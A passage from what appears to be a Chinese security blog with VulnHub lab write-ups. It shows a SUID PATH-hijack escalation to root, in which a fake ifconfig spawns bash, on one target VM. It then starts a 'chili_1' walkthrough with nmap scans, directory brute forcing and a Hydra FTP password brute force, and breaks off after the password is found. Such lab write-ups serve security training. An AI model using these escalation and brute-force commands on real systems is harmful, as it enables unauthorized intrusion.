<span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$port</span>   = <span class="hljs-string">&#x27;3306&#x27;</span>;<br><span class="hljs-variable">$login</span>  = <span class="hljs-string">&#x27;openemr&#x27;</span>;<br><span class="hljs-variable">$pass</span>   = <span class="hljs-string">&#x27;openemr&#x27;</span>;<br><span class="hljs-variable">$dbase</span>  = <span class="hljs-string">&#x27;openemr&#x27;</span>;<br><br>//Added ability to <span class="hljs-built_in">disable</span><br>//utf8 encoding - bm 05-2009<br>global <span class="hljs-variable">$disable_utf8_flag</span>;<br><span class="hljs-variable">$disable_utf8_flag</span> = <span class="hljs-literal">false</span>;<br><br><span class="hljs-variable">$sqlconf</span> = array();<br>global <span class="hljs-variable">$sqlconf</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;host&quot;</span>]= <span class="hljs-variable">$host</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;port&quot;</span>] = <span class="hljs-variable">$port</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;login&quot;</span>] = <span class="hljs-variable">$login</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;pass&quot;</span>] = <span class="hljs-variable">$pass</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;dbase&quot;</span>] = <span class="hljs-variable">$dbase</span>;<br>//////////////////////////<br>//////////////////////////<br>//////////////////////////<br>//////DO NOT TOUCH THIS///<br><span class="hljs-variable">$config</span> = 1; /////////////<br>//////////////////////////<br>//////////////////////////<br>//////////////////////////<br>?&gt;<br>[medical@localhost default]$ su -<br>su -<br>Password: openemr<br><br>su: incorrect password<br></code></pre></td></tr></table></figure><h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><p>失败，尝试看看 SUID 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>147863   12 -rwsr-xr-x   1 root     root         9564 Sep  3  2011 /usr/libexec/pt_chown<br>147695  236 -rws--x--x   1 root     root       238352 Sep  8  2011 /usr/lib/ssh/ssh-keysign<br>145819    8 -rwsr-xr-x   1 root     polkituser     5748 Apr  5  2010 /usr/lib/polkit-resolve-exe-helper<br>145811   12 -rwsr-xr-x   1 root     root         9108 Aug 29  2011 /usr/lib/polkit-1/polkit-agent-helper-1<br>139126   12 -rwsr-xr-x   1 root     root         9940 Nov  2  2011 /usr/lib/chromium-browser/chrome-sandbox<br>145817    8 -rwsr-xr--   1 root     polkituser     7580 Apr  5  2010 /usr/lib/polkit-grant-helper-pam<br>145821   16 -rwsr-xr-x   1 polkituser root        16356 Apr  5  2010 /usr/lib/polkit-set-default-helper<br>147975   12 -rwsr-xr-x   1 root     root        10757 Jun 11  2011 /usr/sbin/fileshareset<br>148146   12 -rwsr-xr-x   1 root     root        12036 Nov 28  2010 /usr/sbin/traceroute6<br>148168   12 -rwsr-xr-x   1 root     root        10713 Aug  2  2011 /usr/sbin/usernetctl<br>148166   36 -rwsr-xr-x   1 root     root        33324 Nov  9  2009 /usr/sbin/userhelper<br>136381   40 -rwsr-sr-x   1 root     root        39020 Jun 26  2011 /usr/bin/crontab<br>136286   44 -rwsr-sr-x   1 daemon   daemon      41036 Jan 19  2010 /usr/bin/at<br>137295   32 -rwsr-xr-x   1 root     root        28916 Dec 28  2010 /usr/bin/pumount<br>136305    4 -rwsr-sr-x   1 daemon   daemon        137 Jan 19  2010 /usr/bin/batch<br>136529   16 -rwsr-xr-x   1 root     root        15848 Jan  9  2010 /usr/bin/expiry<br>137125   32 -rws--x--x   1 root     root        28752 Jan  9  2010 /usr/bin/newgrp<br>137230   20 -rwsr-xr-x   1 root     root        16920 Aug 29  2011 /usr/bin/pkexec<br>137590  120 -rwsr-xr-x   1 root     root       122188 Nov 28  2010 /usr/bin/wvdial<br>137249   40 -rwsr-xr-x   1 root     root        39488 Dec 28  2010 /usr/bin/pmount<br>137440   64 -rws--x--x   1 root     root        63752 Jan 23  2010 /usr/bin/sperl5.10.1<br>136717  364 -rwsr-xr-x   1 root     root       370648 Jan 18  2011 /usr/bin/gpgsm<br>136708   56 -rwsr-xr-x   1 root     root        56100 Jan  9  2010 /usr/bin/gpasswd<br>136347   16 -rws--x--x   1 root     root        12400 Nov 16  2010 /usr/bin/chfn<br>137462   32 -r-sr-xr-x   1 root     root        31144 Nov 16  2010 /usr/bin/su<br>137181   24 -r-s--x--x   1 root     shadow      20512 Jan 30  2010 /usr/bin/passwd<br>136709  936 -rwsr-xr-x   1 root     root       956252 Oct 18  2010 /usr/bin/gpg<br>132151    8 -rwsr-sr-x   1 root     root         5813 Jul 29  2020 /usr/bin/healthcheck<br>136247    8 -rwsr-xr-x   1 root     root         5852 Sep 22  2011 /usr/bin/Xwrapper<br>137222   36 -rwsr-xr-x   1 root     root        35128 Nov 28  2010 /usr/bin/ping6<br>136351   12 -rws--x--x   1 root     root        11664 Nov 16  2010 /usr/bin/chsh<br>   172  308 -rwsr-x---   1 root     messagebus   314400 Sep 29  2011 /lib/dbus-1/dbus-daemon-launch-helper<br>136122   12 -rwsr-xr-x   1 root     root        11114 Jul  6  2011 /sbin/pam_timestamp_check<br>   123   36 -rwsr-xr-x   1 root     root        34848 Nov 28  2010 /bin/ping<br>    83   28 -rwsr-xr-x   1 root     root        26360 Oct 18  2011 /bin/fusermount<br>   144   32 -rwsr-xr-x   1 root     root        31144 Nov 16  2010 /bin/su<br>   111   80 -rwsr-xr-x   1 root     root        80748 Nov 16  2010 /bin/mount<br>   152   32 -rwsr-xr-x   1 root     root        31180 Nov 16  2010 /bin/umount<br></code></pre></td></tr></table></figure><p>看到一个有意思的文件 <code>/usr/bin/healthcheck</code></p><p>看一看权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ <span class="hljs-built_in">ls</span> -liah /usr/bin/healthcheck<br><span class="hljs-built_in">ls</span> -liah /usr/bin/healthcheck<br>132151 -rwsr-sr-x 1 root root 5.7K Jul 29  2020 /usr/bin/healthcheck<br></code></pre></td></tr></table></figure><p>没法修改，尝试看看可读字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ strings /usr/bin/healthcheck<br>strings /usr/bin/healthcheck<br>/lib/ld-linux.so.2<br>__gmon_start__<br>libc.so.6<br>_IO_stdin_used<br>setuid<br>system<br>setgid<br>__libc_start_main<br>GLIBC_2.0<br>PTRhp<br>[^_]<br>clear ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;System Health Check&#x27;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Scanning System&#x27;</span> ; <span class="hljs-built_in">sleep</span> 2 ; ifconfig ; fdisk -l ; <span class="hljs-built_in">du</span> -h<br></code></pre></td></tr></table></figure><p>ifconfig 没有用绝对目录，开始尝试环境变量提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin<br>[medical@localhost default]$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>[medical@localhost tmp]$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>[medical@localhost tmp]$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>.:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin<br>[medical@localhost tmp]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ifconfig<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ifconfig<br>[medical@localhost tmp]$ <span class="hljs-built_in">chmod</span> +x ifconfig<br><span class="hljs-built_in">chmod</span> +x ifconfig<br>[medical@localhost tmp]$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 3.7M<br>393986 drwxrwxrwt  6 root     root     4.0K Aug 12 16:23 ./<br>     2 drwxr-xr-x 21 root     root     4.0K Aug 11 18:28 ../<br>417152 drwxrwxrwt  2 root     root     4.0K Aug 11 18:28 .ICE-unix/<br>420761 -r--r--r--  1 root     root       11 Aug 11 18:28 .X0-lock<br>420762 drwxrwxrwt  2 root     root     4.0K Aug 11 18:28 .X11-unix/<br>424825 -rw-r--r--  1 root     root     1.7K Aug 11 18:28 ddebug.log<br>424987 drwx------  2 medical  medical  4.0K Aug 12 15:52 gpg-1hljcK/<br>423301 drwx------  2 almirant almirant 4.0K Jul 29  2020 gpg-ycbRQr/<br>428578 -rwxr-xr-x  1 medical  medical    10 Aug 12 16:23 ifconfig*<br>425007 -rw-------  1 root     root        0 Jul 29  2020 init.vQ5ZLd<br>428666 -rw-r--r--  1 apache   apache   3.7M Jul 29  2020 setup_dump.sql<br>[medical@localhost tmp]$ /usr/bin/healthcheck<br>/usr/bin/healthcheck<br>TERM environment variable not <span class="hljs-built_in">set</span>.<br>System Health Check<br><br>Scanning System<br>[root@localhost tmp]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>提权成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost tmp]<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>[root@localhost tmp]<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(<span class="hljs-built_in">users</span>),490(polkituser),500(medical),501(fuse)<br>[root@localhost tmp]<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>[root@localhost root]<span class="hljs-comment"># ls -alih</span><br><span class="hljs-built_in">ls</span> -alih<br>total 920K<br>393987 drwxr-x--- 20 root root 4.0K Jul 29  2020 ./<br>     2 drwxr-xr-x 21 root root 4.0K Aug 11 18:28 ../<br>411838 -rw-------  1 root root    0 Sep 11  2011 .ICEauthority<br>428659 -rw-------  1 root root  426 Jul 29  2020 .bash_history<br>411839 -rw-r--r--  1 root root  193 Sep 24  2011 .bash_profile<br>411840 -rw-rw-rw-  1 root root  422 Sep  6  2011 .bashrc<br>411841 drwxr-xr-x  2 root root 4.0K Sep 12  2011 .cache/<br>411843 drwx------  6 root root 4.0K Sep 12  2011 .config/<br>411855 drwx------  3 root root 4.0K Jul 19  2011 .dbus/<br>411858 -rw-------  1 root root   28 Jul 22  2011 .dmrc<br>411859 drwx------  4 root root 4.0K Sep 24  2011 .gconf/<br>411979 drwx------  2 root root 4.0K Sep 24  2011 .gconfd/<br>411981 drwx------  3 root root 4.0K Sep 12  2011 .gnome2/<br>411983 drwx------  2 root root 4.0K Sep 12  2011 .gnome2_private/<br>411835 drwx------  3 root root 4.0K Jul 29  2020 .gnupg/<br>411984 drwx------  2 root root 4.0K Jul 19  2011 .gvfs/<br>411985 drwx------  3 root root 4.0K Sep  6  2011 .<span class="hljs-built_in">local</span>/<br>411995 drwx------  3 root root 4.0K Nov  5  2011 .mc/<br>411999 -rw-r--r--  1 root root    0 Oct 22  2010 .mdk-menu-migrated<br>412000 -rw-r--r--  1 root root    0 Jul 21  2011 .menu-updates.stamp<br>428664 -rw-------  1 root root    6 Jul 29  2020 .mysql_history<br>412001 drwx------  2 root root 4.0K Nov  5  2011 .synaptic/<br>412006 drwx------  2 root root 4.0K Sep 11  2011 .thumbnails/<br>412007 drwxr-xr-x  2 root root 4.0K Jul 29  2020 .xauth/<br>412008 -rw-r--r--  1 root root 1.9K Jul  6  2011 .xbindkeysrc<br>412009 drwxr--r--  2 root root 4.0K Jul 19  2011 Desktop/<br>412010 drwx------  3 root root 4.0K Sep  8  2011 Documents/<br>393989 drwx------  2 root root 4.0K Sep  6  2011 drakx/<br>430643 -rwxr-xr-x  1 root root 5.7K Jul 29  2020 healthcheck*<br>430637 -rw-r--r--  1 root root  182 Jul 29  2020 healthcheck.c<br>428662 -rw-rw-rw-  1 root root 2.1K Jul 29  2020 root.txt<br>430635 -rw-r--r--  1 root root 797K Apr 12  2020 sudo.rpm<br>393988 drwx------  2 root root 4.0K Aug 11 18:28 tmp/<br>[root@localhost root]<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ <br> ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ <br>  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ <br>   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    <br>   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ <br>                                                                                                                          <br>                                                                                                                          <br>Thanks <span class="hljs-keyword">for</span> Playing!<br><br>Follow me at: http://v1n1v131r4.com<br><br><br>root <span class="hljs-built_in">hash</span>: eaff25eaa9ffc8b62e3dfebf70e83a7b<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>chili_1 靶机</title>
    <link href="/2023/08/47a5f7d3b51c.html"/>
    <url>/2023/08/47a5f7d3b51c.html</url>
    
    <content type="html"><![CDATA[<h1 id="chili-1-靶机"><a href="#chili-1-靶机" class="headerlink" title="chili_1 靶机"></a>chili_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/chili_1]<br>└─$ sudo nmap -sT -sV -sC -O -p21,80 192.1.1.140<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 07:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.140<br>Host is up (0.00030s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Chili<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 00:0C:29:B2:10:06 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Unix<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 17.69 seconds<br></code></pre></td></tr></table></figure><p>开放了两个端口，ftp 的版本号搜索后发现只有拒绝服务漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/chili_1]<br>└─$ sudo nmap --script=vuln -p21,80 192.1.1.140<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 07:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.140<br>Host is up (0.00026s latency).<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>80/tcp open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">MAC Address: 00:0C:29:B2:10:06 (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 37.47 seconds</span><br></code></pre></td></tr></table></figure><p>这里漏洞脚本没有任何结果，这里大概率不存在匿名登录 ftp 的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.140  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 09:25 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.140<br>Host is up (0.00038s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:B2:10:06 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.90 seconds<br></code></pre></td></tr></table></figure><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>UDP 端口也没开，那就看看 web 端，同时进行目录爆破吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.1.1.140/     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.140/-_23-08-06_08-03-24.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-06_08-03-24.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.140/<br><br>[08:03:24] Starting: <br>[08:03:25] 403 -  276B  - /.ht_wsr.txt                                     <br>[08:03:25] 403 -  276B  - /.htaccess.bak1                                  <br>[08:03:25] 403 -  276B  - /.htaccess_extra<br>[08:03:25] 403 -  276B  - /.htaccess.sample<br>[08:03:25] 403 -  276B  - /.htaccess_orig<br>[08:03:25] 403 -  276B  - /.htaccess.orig<br>[08:03:25] 403 -  276B  - /.htaccessOLD2<br>[08:03:25] 403 -  276B  - /.htaccess.save<br>[08:03:25] 403 -  276B  - /.htaccess_sc<br>[08:03:25] 403 -  276B  - /.htaccessOLD<br>[08:03:25] 403 -  276B  - /.html<br>[08:03:25] 403 -  276B  - /.htaccessBAK                                    <br>[08:03:25] 403 -  276B  - /.htm<br>[08:03:25] 403 -  276B  - /.htpasswds<br>[08:03:25] 403 -  276B  - /.htpasswd_test<br>[08:03:25] 403 -  276B  - /.httr-oauth<br>[08:03:26] 403 -  276B  - /.php                                            <br>[08:03:26] 200 -  736B  - /.vim/                                            <br>[08:03:41] 200 -  657B  - /index.html                                       <br>[08:03:49] 403 -  276B  - /server-status                                    <br>[08:03:49] 403 -  276B  - /server-status/                                   <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>发现了&#x2F;.vim 目录，浏览器端进去之后发现没有文件，通过 nikto 扫描了一下，并没有文件上传的 PUT 方法。</p><p>浏览器访问 80 端口的默认界面只有一张图片，看看源码吧</p><p><img src="/pic/c5d8254ab14f4631b3953479fc2f2200_MD5.png"></p><p>有一些信息，查了查资料发现，这里的 meta 是给爬虫看的，看来看去，感觉只有 <code>chili</code> 或者 <code>chile</code>，以及 <code>Chile_Web.jpg</code> 有价值</p><p>又换了个目录爆破工具试了试，确实没得到特别有价值的信息。那么 80 端口的渗透攻击路径就卡住</p><h2 id="判断是否图片隐写"><a href="#判断是否图片隐写" class="headerlink" title="判断是否图片隐写"></a>判断是否图片隐写</h2><p>接下来我尝试了对 <code>Chile_Web.jpg</code> 进行信息隐藏的发现，使用了 <code>exiftool</code>, <code>file</code>, <code>binwalk</code>, <code>strings</code>, <code>stegcracker</code>, <code>010 editor</code>, <code>stegsolve</code> 进行查看，但均无收获，这个过程中 chatgpt 起到的辅助作用很大，帮助我迅速了解一些字段的含义，快速判断是否存在信息隐藏</p><h2 id="ftp-爆破"><a href="#ftp-爆破" class="headerlink" title="ftp 爆破"></a>ftp 爆破</h2><p>那就只能尝试对 ftp 进行爆破了，一开始爆破了五分钟没成功，以为这条攻击路径不对，又去纠结目录结构和图片隐藏信息了，后面实在没思路，看了眼 WP，发现这次爆破要等的时间比较长，大约 15min 左右。怎么说呢，确实需要改进自己原本的想法，对于爆破还是要爆破到结束才行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/chili_1]<br>└─$ hydra -l chili -P /usr/share/wordlists/rockyou.txt 192.1.1.140 ftp -t 32<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-09 17:06:58<br>[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task<br>[DATA] attacking ftp://192.1.1.140:21/<br>[STATUS] 576.00 tries/min, 576 tries <span class="hljs-keyword">in</span> 00:01h, 14343823 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 415:03h, 32 active<br>[STATUS] 590.33 tries/min, 1771 tries <span class="hljs-keyword">in</span> 00:03h, 14342628 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 404:56h, 32 active<br>[STATUS] 574.43 tries/min, 4021 tries <span class="hljs-keyword">in</span> 00:07h, 14340378 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 416:05h, 32 active<br>[21][ftp] host: 192.1.1.140   login: chili   password: a1b2c3d4<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-09 17:14:47<br></code></pre></td></tr></table></figure><p>修改了线程数为 32，将 15 分钟的爆破压缩成了 7 分钟+</p><p>利用这个口令登录到 ftp 上，翻看网站目录和用户家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 